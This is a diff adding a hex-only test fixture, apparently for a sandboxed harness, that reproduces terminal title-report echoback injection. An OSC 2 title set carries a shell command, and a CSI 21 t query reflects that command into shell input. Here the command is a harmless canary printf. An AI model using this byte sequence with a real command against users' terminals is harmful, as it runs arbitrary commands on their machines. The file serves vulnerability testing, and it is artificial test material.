@@ -1,0 +1,14 @@
+# canary-forked title-report echoback -- see meta.yaml and expected.md.
+# HEX ONLY (read-safe). Decoded to live bytes ONLY by the sandbox harness.
+# The window title is set to a SAFE canary command (not a harmful one), then the
+# terminal is asked to report the title; a vulnerable terminal reflects it to the
+# shell input, where a newline runs it -- firing only the harmless canary marker.
+
+# OSC 2 ;   (set window title)
+1b 5d 32 3b
+# <canary-forked command>: printf %s "$POC_CANARY_TOKEN" > "$POC_CANARY"
+70 72 69 6e 74 66 20 25 73 20 22 24 50 4f 43 5f 43 41 4e 41 52 59 5f 54 4f 4b 45 4e 22 20 3e 20 22 24 50 4f 43 5f 43 41 4e 41 52 59 22
+# BEL       (string terminator)
+07
+# CSI 2 1 t (report window title -> reflected to the shell input on a vuln term)
+1b 5b 32 31 74
